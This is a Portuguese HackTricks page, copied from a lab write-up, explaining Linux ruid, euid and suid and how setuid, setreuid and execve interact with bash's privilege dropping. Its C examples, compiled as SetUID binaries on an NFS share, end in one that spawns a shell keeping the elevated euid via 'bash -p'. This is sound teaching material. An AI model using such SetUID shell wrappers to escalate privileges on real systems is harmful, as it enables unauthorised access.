# euid, ruid, suid

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

**Este post foi copiado de** [**https://0xdf.gitlab.io/2022/05/31/setuid-rabbithole.html#testing-on-jail**](https://0xdf.gitlab.io/2022/05/31/setuid-rabbithole.html#testing-on-jail)

## **`*uid`**

* **`ruid`**: Este é o **ID de usuário real** do usuário que iniciou o processo.
* **`euid`**: Este é o **ID de usuário efetivo**, é o que o sistema olha ao decidir **quais privilégios o processo deve ter**. Na maioria dos casos, o `euid` será o mesmo que o `ruid`, mas um binário SetUID é um exemplo de um caso em que eles diferem. Quando um binário **SetUID** é iniciado, o **`euid` é definido como o proprietário do arquivo**, o que permite que esses binários funcionem.
* `suid`: Este é o **ID de usuário salvo**, é usado quando um processo privilegiado (na maioria dos casos, executando como root) precisa **abandonar privilégios** para executar algum comportamento, mas precisa então **voltar** ao estado privilegiado.

{% hint style="info" %}
Se um **processo não-root** quiser **alterar seu `euid`**, ele só pode **definir** para os valores atuais de **`ruid`**, **`euid`** ou **`suid`**.
{% endhint %}

## set\*uid

À primeira vista, é fácil pensar que as chamadas do sistema **`setuid`** definiriam o `ruid`. Na verdade, quando para um processo privilegiado, isso acontece. Mas no caso geral, na verdade **define o `euid`**. Da [página do manual](https://man7.org/linux/man-pages/man2/setuid.2.html):

> setuid() **define o ID de usuário efetivo do processo chamador**. Se o processo chamador tiver privilégios (mais precisamente: se o processo tiver a capacidade CAP\_SETUID em seu namespace de usuário), o UID real e o ID de usuário salvo também são definidos.

Portanto, no caso em que você está executando `setuid(0)` como root, isso define todos os IDs como root e basicamente os trava (porque `suid` é 0, ele perde o conhecimento ou qualquer usuário anterior - é claro, processos root podem mudar para qualquer usuário que desejarem).

Duas chamadas de sistema menos comuns, **`setreuid`** (`re` para real e efetivo) e **`setresuid`** (`res` inclui salvo) definem os IDs específicos. Estar em um processo não privilegiado limita essas chamadas (da [página do manual](https://man7.org/linux/man-pages/man2/setresuid.2.html) para `setresuid`, embora a [página](https://man7.org/linux/man-pages/man2/setreuid.2.html) para `setreuid` tenha linguagem semelhante):

> Um processo não privilegiado pode alterar seu **UID real, UID efetivo e ID de usuário salvo**, cada um para um dos seguintes: o UID real atual, o UID efetivo atual ou o ID de usuário salvo atual.
>
> Um processo privilegiado (no Linux, aquele que possui a capacidade CAP\_SETUID) pode definir seu UID real, UID efetivo e ID de usuário salvo para valores arbitrários.

É importante lembrar que eles não estão aqui como uma característica de segurança, mas sim refletem o fluxo de trabalho pretendido. Quando um programa deseja mudar para outro usuário, ele muda o ID de usuário efetivo para que possa agir como esse usuário.

Como atacante, é fácil adquirir o hábito ruim de apenas chamar `setuid` porque o caso mais comum é ir para root, e nesse caso, `setuid` é efetivamente o mesmo que `setresuid`.

## Execução

### **execve (e outros execs)**

A chamada do sistema `execve` executa um programa especificado no primeiro argumento. O segundo e terceiro argumentos são matrizes, os argumentos (`argv`) e o ambiente (`envp`). Existem várias outras chamadas do sistema que são baseadas em `execve`, referidas como `exec` ([página do manual](https://man7.org/linux/man-pages/man3/exec.3.html)). Cada um deles é apenas um invólucro em cima de `execve` para fornecer diferentes abreviações para chamar `execve`.

Há muitos detalhes na [página do manual](https://man7.org/linux/man-pages/man2/execve.2.html), sobre como funciona. Em resumo, quando **`execve` inicia um programa
```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setuid(1000);
    system("id");
    return 0;
}
```
Este programa é compilado e definido como SetUID em Jail sobre NFS:
```bash
oxdf@hacky$ gcc a.c -o /mnt/nfsshare/a;
...[snip]...
oxdf@hacky$ chmod 4755 /mnt/nfsshare/a
```
Como root, eu posso ver este arquivo:
```
[root@localhost nfsshare]# ls -l a 
-rwsr-xr-x. 1 frank frank 16736 May 30 04:58 a
```
Quando eu executo isso como ninguém, `id` é executado como ninguém:
```bash
bash-4.2$ $ ./a
uid=99(nobody) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
```
O programa começa com um `ruid` de 99 (ninguém) e um `euid` de 1000 (frank). Quando chega à chamada `setuid`, esses mesmos valores são definidos.

Em seguida, é chamado o `system`, e eu esperaria ver um `uid` de 99, mas também um `euid` de 1000. Por que não há um? O problema é que **`sh` é um link simbólico para `bash`** nesta distribuição:
```
$ ls -l /bin/sh
lrwxrwxrwx. 1 root root 4 Jun 25  2017 /bin/sh -> bash
```
Então, a chamada do `system` é `/bin/sh sh -c id`, que é efetivamente `/bin/bash bash -c id`. Quando o `bash` é chamado, sem o `-p`, ele vê o `ruid` de 99 e o `euid` de 1000, e define o `euid` para 99.

### setreuid / system <a href="#setreuid--system" id="setreuid--system"></a>

Para testar essa teoria, vou tentar substituir o `setuid` pelo `setreuid`:
```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setreuid(1000, 1000);
    system("id");
    return 0;
}
```
Compilação e Permissões:
```
oxdf@hacky$ gcc b.c -o /mnt/nfsshare/b; chmod 4755 /mnt/nfsshare/b
```
Agora na prisão, agora `id` retorna uid de 1000:
```
bash-4.2$ $ ./b
uid=1000(frank) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
```
A chamada `setreuid` define tanto `ruid` quanto `euid` como 1000, então quando `system` chamou `bash`, eles coincidiram e as coisas continuaram como frank.

### setuid / execve <a href="#setuid--execve" id="setuid--execve"></a>

Chamando `execve`, se minha compreensão acima estiver correta, eu também não precisaria me preocupar em mexer com os uids e, em vez disso, chamar `execve`, pois isso manterá os IDs existentes. Isso funcionará, mas há armadilhas. Por exemplo, o código comum pode parecer com isso:
```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setuid(1000);
    execve("/usr/bin/id", NULL, NULL);
    return 0;
}
```
Sem o ambiente (estou passando NULL para simplificar), vou precisar de um caminho completo em `id`. Isso funciona, retornando o que eu espero:
```
bash-4.2$ $ ./c
uid=99(nobody) gid=99(nobody) euid=1000(frank) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
```
O `[r]uid` é 99, mas o `euid` é 1000.

Se eu tentar obter um shell a partir disso, tenho que ter cuidado. Por exemplo, apenas chamando `bash`:
```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setuid(1000);
    execve("/bin/bash", NULL, NULL);
    return 0;
}
```
Eu vou compilar isso e definir o SetUID:
```
oxdf@hacky$ gcc d.c -o /mnt/nfsshare/d
oxdf@hacky$ chmod 4755 /mnt/nfsshare/d
```
Ainda assim, isso retornará todos os nobody:
```
bash-4.2$ $ ./d
bash-4.2$ $ id
uid=99(nobody) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
```
Se fosse `setuid(0)`, funcionaria bem (assumindo que o processo tinha permissão para isso), pois então mudaria todos os três ids para 0. Mas como um usuário não-root, isso apenas define o `euid` para 1000 (que já era), e então chama `sh`. Mas `sh` é `bash` no Jail. E quando `bash` começa com `ruid` de 99 e `euid` de 1000, ele irá rebaixar o `euid` de volta para 99.

Para corrigir isso, vou chamar `bash -p`:
```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    char *const paramList[10] = {"/bin/bash", "-p", NULL};
    setuid(1000);
    execve(paramList[0], paramList, NULL);
    return 0;
}
```
Desta vez, o `euid` está presente:
```
bash-4.2$ $ ./e
bash-4.2$ $ id
uid=99(nobody) gid=99(nobody) euid=1000(frank) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
```
Ou eu poderia chamar `setreuid` ou `setresuid` em vez de `setuid`.
